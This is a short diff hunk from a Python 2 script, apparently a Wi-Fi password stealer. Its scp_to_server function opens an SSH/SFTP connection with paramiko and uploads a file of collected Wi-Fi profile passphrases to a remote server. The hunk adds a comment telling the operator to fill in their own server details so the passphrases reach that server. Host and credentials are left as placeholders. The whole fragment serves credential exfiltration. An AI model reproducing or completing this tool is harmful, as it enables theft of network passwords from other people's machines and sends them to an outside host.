@@ -58,6 +58,7 @@ def scp_to_server():
 	out,err = get_username.communicate()
 	print str(out.strip('\n').strip('\r'))+'WiFi'
 	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+#       Edit this line with your server details to upload the passphrases to your server
 	ssh.connect('#', port=22, username='#',password='#')
 	sftp = ssh.open_sftp()
 	location = str(stdout.strip('\n').strip('\r'))+ "\WiFi_Profile_Passphrases.txt"
